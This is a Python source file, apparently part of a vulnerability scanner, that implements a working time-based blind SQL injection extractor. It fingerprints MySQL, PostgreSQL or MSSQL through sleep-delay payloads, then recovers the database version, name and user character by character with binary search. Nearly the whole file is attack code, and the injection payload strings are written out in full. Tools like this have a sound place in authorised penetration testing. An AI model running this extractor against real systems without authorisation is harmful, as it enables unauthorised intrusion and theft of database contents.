"""Blind SQLi Data Extraction via Binary Search with DBMS Auto-detection."""

import asyncio
import time
from typing import Dict, List, Optional, Callable


class BlindSQLiExtractor:
    """Extract data from blind SQLi using binary search per character (supports MySQL, PostgreSQL, MSSQL)."""

    CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-:@/ "

    # DBMS Queries configurations
    DBMS_QUERIES = {
        "mysql": {
            "version": "VERSION()",
            "database": "DATABASE()",
            "user": "USER()",
        },
        "postgresql": {
            "version": "VERSION()",
            "database": "CURRENT_DATABASE()",
            "user": "CURRENT_USER",
        },
        "mssql": {
            "version": "@@VERSION",
            "database": "DB_NAME()",
            "user": "USER_NAME()",
        }
    }

    def __init__(self, send_fn: Callable):
        self.send_fn = send_fn
        self.db_type = "mysql"  # Default fallback

    async def detect_db(self, url: str, param: str) -> str:
        """Probes the target to identify the active DBMS flavor (MySQL, PostgreSQL, MSSQL) using timing."""
        db_probes = {
            "mysql": "' AND IF(1=1, SLEEP(3), 0) -- -",
            "postgresql": "' AND (SELECT 1 FROM PG_SLEEP(3)) -- -",
            "mssql": "'; WAITFOR DELAY '00:00:03' -- -",
        }

        # Measure baseline timing
        t0 = time.time()
        await self.send_fn(url, param, "'", timeout=5)
        baseline = time.time() - t0

        detected = "mysql"  # default fallback
        for db, payload in db_probes.items():
            try:
                t_start = time.time()
                r = await self.send_fn(url, param, payload, timeout=10)
                elapsed = r.get("time", time.time() - t_start)
                if elapsed - baseline >= 2.0:
                    detected = db
                    break
            except Exception:
                continue

        self.db_type = detected
        return detected

    async def _test(self, url: str, param: str, condition: str) -> bool:
        """Test if a SQL condition is true based on the active DBMS timing payload."""
        if self.db_type == "mysql":
            payload = f"' AND IF({condition}, SLEEP(4), 0) -- -"
        elif self.db_type == "postgresql":
            payload = f"' AND (SELECT CASE WHEN ({condition}) THEN PG_SLEEP(4) ELSE PG_SLEEP(0) END) -- -"
        elif self.db_type == "mssql":
            payload = f"'; IF ({condition}) WAITFOR DELAY '00:00:04' -- -"
        else:
            payload = f"' AND IF({condition}, SLEEP(4), 0) -- -"

        r = await self.send_fn(url, param, payload, timeout=12)
        elapsed = r.get("time", 0)
        return elapsed > 3.0

    async def extract(self, url: str, param: str, query: str, max_len: int = 50) -> str:
        """Binary search extraction: query = SQL expression like 'VERSION()'."""
        # Find length of string
        length = 0
        for i in range(1, max_len + 1):
            if await self._test(url, param, f"LENGTH({query}) >= {i}" if self.db_type != "mssql" else f"LEN({query}) >= {i}"):
                length = i
            else:
                break
        if length == 0:
            return ""

        # Extract each char via binary search
        result = ""
        for pos in range(1, length + 1):
            low, high = 32, 126  # printable ASCII range
            while low <= high:
                mid = (low + high) // 2
                if self.db_type == "mysql":
                    cond = f"ASCII(SUBSTRING({query},{pos},1)) > {mid}"
                elif self.db_type == "postgresql":
                    cond = f"ASCII(SUBSTR({query},{pos},1)) > {mid}"
                elif self.db_type == "mssql":
                    cond = f"ASCII(SUBSTRING({query},{pos},1)) > {mid}"
                else:
                    cond = f"ASCII(SUBSTRING({query},{pos},1)) > {mid}"

                if await self._test(url, param, cond):
                    low = mid + 1
                else:
                    high = mid - 1
            result += chr(low)
        return result

    async def extract_all(self, url: str, param: str) -> List[Dict]:
        """Auto-detects DB type first, then extracts common database info."""
        findings = []
        db_flavor = await self.detect_db(url, param)
        queries = self.DBMS_QUERIES.get(db_flavor, self.DBMS_QUERIES["mysql"])

        for name, query in queries.items():
            val = await self.extract(url, param, query)
            if val:
                findings.append({
                    "type": "sqli_extracted",
                    "title": f"SQLi Data: {name}",
                    "url": url[:200],
                    "detail": f"DBMS: {db_flavor.upper()}, {name} = {val}",
                    "param": param,
                    "confidence": "confirmed",
                })
        return findings
